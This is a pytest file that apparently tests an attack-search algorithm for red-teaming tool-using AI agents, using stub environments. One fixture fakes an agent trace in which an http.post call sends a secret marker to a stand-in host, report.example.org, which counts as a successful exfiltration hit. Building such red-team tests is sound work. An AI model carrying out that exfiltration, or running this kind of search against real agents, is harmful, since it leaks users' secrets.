from attack import AttackAlgorithm
from aicomp_sdk.attacks import AttackRunConfig


class _FakeEnv:
    """Minimal env satisfying the protocol read by run()."""

    def __init__(self):
        self.seed = 123

    def reset(self, *a, **k):
        pass

    def interact(self, msg, max_tool_hops=None):
        return None

    def export_trace_dict(self):
        return {"tool_events": [], "user_messages": [], "egress": [], "seed": 123}

    def snapshot(self):
        return None

    def restore(self, s):
        pass


def test_run_returns_list_of_candidates():
    result = AttackAlgorithm().run(_FakeEnv(), AttackRunConfig(time_budget_s=1))
    assert isinstance(result, list)


import base64
from attack import AttackAlgorithm, SECRET_MARKER


class _ScriptedEnv:
    """Env whose every export_trace_dict returns a trace that triggers EXFILTRATION,
    but with a distinct user message each interact (so Phase 2 finds distinct hits)."""

    def __init__(self):
        self.seed = 123
        self._n = 0

    def reset(self, *a, **k):
        pass

    def interact(self, msg, max_tool_hops=None):
        self._n += 1
        return None

    def export_trace_dict(self):
        return {
            "tool_events": [{
                "name": "http.post", "ok": True, "side_effect": "SHARE",
                "source": "tool",
                "args": {"url": f"https://report.example.org/log", "data": SECRET_MARKER},
            }],
            "user_messages": [f"probe {self._n}"],   # distinct per call
            "egress": [], "seed": 123,
        }

    def snapshot(self):
        return None

    def restore(self, s):
        pass


def test_phase2_appends_live_hits_and_dedups():
    algo = AttackAlgorithm({"search_enabled": True})
    seed = []  # nothing from Phase 1
    hits = algo._phase2(_ScriptedEnv(), budget_s=0.5, hops=8, seed_candidates=seed)
    assert len(hits) >= 1
    # all distinct
    msgs = [c.user_messages for c in hits]
    assert len(msgs) == len(set(msgs))


def test_phase2_respects_margin_and_terminates():
    algo = AttackAlgorithm({"search_enabled": True})
    # tiny budget -> must still terminate quickly (margin respected)
    hits = algo._phase2(_ScriptedEnv(), budget_s=0.3, hops=8, seed_candidates=[])
    assert isinstance(hits, list)


def test_phase2_dedups_against_seed_candidates():
    algo = AttackAlgorithm({"search_enabled": True})
    from aicomp_sdk.attacks import AttackCandidate
    seed = [AttackCandidate(user_messages=("probe 1",))]  # will collide with first hit
    hits = algo._phase2(_ScriptedEnv(), budget_s=0.5, hops=8, seed_candidates=seed)
    assert ("probe 1",) not in [c.user_messages for c in hits]
